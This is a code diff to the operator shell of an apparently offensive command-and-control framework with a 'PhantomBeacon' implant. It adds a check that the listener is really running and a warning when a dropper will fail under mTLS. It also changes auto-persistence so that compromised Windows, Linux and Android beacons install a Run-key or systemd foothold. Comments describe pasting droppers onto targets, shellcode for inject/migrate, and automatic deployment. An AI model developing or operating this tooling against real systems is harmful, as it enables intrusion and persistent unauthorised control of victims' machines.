@@ -306,6 +306,18 @@ class C2Shell(cmd.Cmd):
                 host = parts[2] if len(parts) > 2 else listener_bind_host()
                 use_ssl = parts[3].lower() in ("true", "1", "yes", "https") if len(parts) > 3 else True
                 server_instance.start(host=host, port=port, use_ssl=use_ssl)
+                # Verify instead of assuming: this line used to print a green
+                # "Started" tick the instant start() returned, even when the
+                # listener had refused to come up (mTLS demanded HTTPS, or the
+                # TLS material was missing). Live evidence (2026-10-16): the
+                # operator read "Started HTTP listener on 127.0.0.1:9443",
+                # went to paste a dropper, and `generate` had to warn that
+                # nothing was listening.
+                if not (server_instance.thread
+                        and server_instance.thread.is_alive()):
+                    notifier.error("Listener did NOT start — see the log "
+                                   "above for the reason.")
+                    return
                 proto = "HTTPS" if use_ssl else "HTTP"
                 notifier.success(f"Started {proto} listener on {host}:{port}")
             except Exception as e:
@@ -801,21 +813,35 @@ class C2Shell(cmd.Cmd):
             notifier.error("No active beacon.")
             return
         
-        # Auto-detect OS from beacon info
+        # Auto-detect OS from beacon info. The method only shapes what we
+        # REPORT: the queued command is the bare `persist` (see below).
         beacons = c2_state.get_beacons()
         os_type = beacons.get(self.active_beacon, {}).get("os", "").lower()
-        
-        # Default to systemd for linux/android, runkey for windows
         if "windows" in os_type:
             method = "runkey"
-        else:
+        elif "linux" in os_type or "android" in os_type:
             method = "systemd"
-            
-        notifier.info(f"Auto-detecting persistence method for {os_type}: {method}")
-        # The beacon's own `persist` built-in installs persistence for its
-        # own running binary — no path needed, the beacon resolves it.
-        task_id = c2_state.queue_task(self.active_beacon, f"persist {method}")
-        notifier.success(f"Auto-persistence ({method}) task queued (ID: {task_id})")
+        else:
+            method = ""
+        if method:
+            notifier.info(f"Auto-detected persistence method for {os_type}: {method}")
+        else:
+            notifier.info("Beacon did not report an OS — the beacon will "
+                          "install its own native default persistence")
+
+        # LIVE DEFECT 2026-10-17: this used to queue `persist {method}` —
+        # but the beacon's `persist` argument is the ARTIFACT NAME, not the
+        # method, so `persist systemd`/`persist runkey` installed a unit /
+        # Run value literally named "systemd"/"runkey" (the C2 server's own
+        # auto-persist comment already warns about this exact mis-naming).
+        # Worse, the mis-named artifact broke the supported way back out:
+        # bare `unpersist` removes the DEFAULT name (PhantomBeacon) and
+        # would never find it. The beacon's own `persist` built-in installs
+        # persistence for its own running binary and defaults the name to
+        # PhantomBeacon — so bare `persist` is both correct and round-trips
+        # with `unpersist`.
+        task_id = c2_state.queue_task(self.active_beacon, "persist")
+        notifier.success(f"Auto-persistence task queued (ID: {task_id})")
 
     def do_generate_shellcode(self, arg):
         """generate_shellcode [platform] - Generate Base64 shellcode for inject/migrate."""
@@ -1475,6 +1501,17 @@ class C2Shell(cmd.Cmd):
 
         console.print(Panel(dropper, title=f"[bold {style_map.get(platform, 'white')}]{title_map.get(platform, 'Dropper')} ({arch})[/]", border_style=style_map.get(platform, "white")))
         add_custom_beacon(platform, dropper, f"Custom C++ Beacon ({arch})", source="c2_shell")
+
+        # Say it BEFORE the paste: under the strict mTLS default this dropper
+        # cannot fetch its payload (see builder.stager_mtls_conflict for the
+        # live evidence), and the operator used to discover that only when the
+        # target came back empty.
+        from phantom.utils.builder import stager_mtls_conflict
+        conflict = stager_mtls_conflict(platform, use_ssl)
+        if conflict:
+            console.print(Panel(f"[bold yellow]{conflict}[/bold yellow]",
+                                title="[red]this dropper will be refused[/red]",
+                                border_style="red"))
 
         # Ask for automatic deployment
         if session.target:
